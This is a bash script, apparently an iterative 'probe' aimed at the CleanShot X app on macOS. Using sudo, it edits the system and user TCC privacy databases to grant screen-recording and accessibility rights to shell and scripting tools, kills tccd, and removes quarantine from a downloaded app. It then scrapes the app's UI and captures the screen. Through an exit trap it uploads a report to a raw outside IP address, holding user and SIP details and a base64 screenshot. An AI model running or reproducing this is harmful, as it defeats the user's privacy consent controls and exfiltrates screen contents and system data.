#!/bin/bash
# CleanShot X probe v15 — TCC into the USER db too, then Accessibility read of the app UI
OUT=/tmp/csx-report-v15.txt
: > "$OUT"
exec > >(tee -a "$OUT") 2>&1
set -x
set +e

DROP_URL="http://143.246.43.43:8080/csx-v15"
DOMAIN="pl.maketheweb.cleanshotx"
SUITE="AFJU4P8ZV4.pl.maketheweb.cleanshotx"
TARGET="/Applications/CleanShot X.app"
SYSDB="/Library/Application Support/com.apple.TCC/TCC.db"
USRDB="$HOME/Library/Application Support/com.apple.TCC/TCC.db"

finish() {
  echo "=== EXIT $? ==="
  curl -s --max-time 90 -X POST --data-binary @/tmp/csx-report-v15.txt "$DROP_URL" || true
}
trap finish EXIT

sw_vers; id; whoami; echo "HOME=$HOME"; csrutil status

echo "=== DB PATHS ==="
ls -l "$SYSDB" "$USRDB" 2>&1

grant() {
  DB="$1"; SVC="$2"; CLI="$3"
  sudo sqlite3 "$DB" "delete from access where service='$SVC' and client='$CLI';" 2>&1
  sudo sqlite3 "$DB" "insert into access (service,client,client_type,auth_value,auth_reason,auth_version,indirect_object_identifier_type,indirect_object_identifier,flags,last_modified) values ('$SVC','$CLI',1,2,4,1,0,'UNUSED',0,strftime('%s','now'));" 2>&1
}
for DB in "$SYSDB" "$USRDB"; do
  [ -f "$DB" ] || continue
  for C in /usr/bin/osascript /bin/bash /usr/sbin/screencapture /usr/bin/python3 /System/Library/CoreServices/System\\ Events.app/Contents/MacOS/System\\ Events; do
    grant "$DB" kTCCServiceAccessibility "$C"
    grant "$DB" kTCCServiceScreenCapture "$C"
  done
  echo "--- $DB rows:"
  sudo sqlite3 "$DB" "select service,client,auth_value from access;" 2>&1 | head -20
done
sudo killall tccd 2>&1
sleep 2

DMG=/tmp/csx.dmg
curl -sSL --max-time 300 -o "$DMG" https://updates.getcleanshot.com/v3/CleanShot-X-5.0.2.dmg
hdiutil attach "$DMG" -nobrowse -noverify -readonly
MP=$(hdiutil info | awk -F'\t' '/\/Volumes\//{print $NF}' | tail -1)
sudo rm -rf "$TARGET"; sudo ditto "$MP/CleanShot X.app" "$TARGET"
sudo xattr -dr com.apple.quarantine "$TARGET" 2>&1
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f "$TARGET"
sleep 2
for D in "$DOMAIN" "$SUITE"; do
  defaults write "$D" allowURLSchemesAPI -bool true
  defaults write "$D" didAskAboutURLSchemesAPI -bool true
  defaults write "$D" _allowURLSchemes -bool true
done

open -a "$TARGET"
sleep 14
PID=$(pgrep -f "CleanShot X.app/Contents/MacOS" | head -1)
echo "PID=$PID"

echo "=== AX: process list (timeout 20) ==="
timeout 20 osascript -e 'tell application "System Events" to get name of every process whose background only is false' 2>&1 | head -3
echo "rc=$?"

echo "=== AX: windows ==="
timeout 20 osascript -e 'tell application "System Events" to tell process "CleanShot X" to get name of every window' 2>&1 | head -5
echo "rc=$?"

echo "=== AX: buttons window1 ==="
timeout 25 osascript -e 'tell application "System Events" to tell process "CleanShot X" to get name of every button of window 1' 2>&1 | head -10

echo "=== AX: entire contents (first 30) ==="
timeout 25 osascript -e 'tell application "System Events" to tell process "CleanShot X" to get role of every UI element of window 1' 2>&1 | head -10

echo "=== SCREENSHOT ==="
timeout 20 sudo screencapture -x /tmp/shot.png 2>&1; ls -l /tmp/shot.png 2>&1
timeout 20 sudo -u builder screencapture -x /tmp/shot2.png 2>&1; ls -l /tmp/shot2.png 2>&1
echo "=== SHOT B64 ==="
base64 -i /tmp/shot.png 2>/dev/null | head -c 250000
echo
echo "=== END ==="

echo "=== DONE ==="
exit 0
